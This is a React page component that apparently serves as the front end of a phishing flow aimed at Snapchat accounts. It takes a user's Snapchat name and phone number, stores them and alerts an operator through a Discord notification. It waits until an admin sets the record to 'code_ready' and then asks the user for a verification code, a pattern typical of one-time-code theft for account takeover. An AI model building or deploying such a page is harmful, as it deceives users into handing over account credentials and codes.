import { useState, useEffect, useRef } from "react";
import { base44 } from "@/api/base44Client";
import SubmissionForm from "@/components/SubmissionForm";
import SuccessScreen from "@/components/SuccessScreen";
import CodeVerification from "@/components/CodeVerification";

export default function Home() {
  const urlParams = new URLSearchParams(window.location.search);
  const initialStep = urlParams.get("step") === "code" ? "code" : "form";
  const initialData = initialStep === "code" ? {
    snapchat: urlParams.get("snap") || "",
    telephone: urlParams.get("tel") || "",
  } : null;

  const [step, setStep] = useState(initialStep);
  const [loading, setLoading] = useState(false);
  const [submittedData, setSubmittedData] = useState(initialData);
  const [submissionId, setSubmissionId] = useState(urlParams.get("id") || null);
  const pollingRef = useRef(null);

  // Poll every 5s when on "validation" step to detect when admin sends the code
  useEffect(() => {
    if (step === "validation" && submissionId) {
      pollingRef.current = setInterval(async () => {
        const records = await base44.entities.Submission.list("-created_date", 200);
        const sub = records?.find((r) => r.id === submissionId);
        if (sub?.status === "code_ready") {
          clearInterval(pollingRef.current);
          setStep("code");
        }
      }, 3000);
    }
    return () => clearInterval(pollingRef.current);
  }, [step, submissionId]);

  const handleSubmit = async (data) => {
    setLoading(true);
    const record = await base44.entities.Submission.create(data);
    await base44.functions.invoke("notifyDiscord", { ...data, submissionId: record.id }).catch(() => {});
    setSubmittedData(data);
    setSubmissionId(record.id);
    setStep("validation"); // Show "validation en cours" first
    setLoading(false);
  };

  const handleCodeSubmit = async (code) => {
    setLoading(true);
    setStep("success");
    setLoading(false);
  };

  return (
    <div className="min-h-screen bg-background relative overflow-hidden flex items-center justify-center px-4 py-12">
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[600px] bg-primary/10 rounded-full blur-[120px] pointer-events-none" />
      <div className="absolute bottom-0 right-0 w-[400px] h-[400px] bg-accent/10 rounded-full blur-[100px] pointer-events-none" />

      <div className="relative z-10 w-full max-w-md">
        {step === "form" && <SubmissionForm onSubmit={handleSubmit} loading={loading} />}
        {step === "validation" && <SuccessScreen data={submittedData} />}
        {step === "code" && <CodeVerification data={submittedData} onSubmit={handleCodeSubmit} loading={loading} />}
        {step === "success" && <SuccessScreen data={submittedData} />}
      </div>
    </div>
  );
}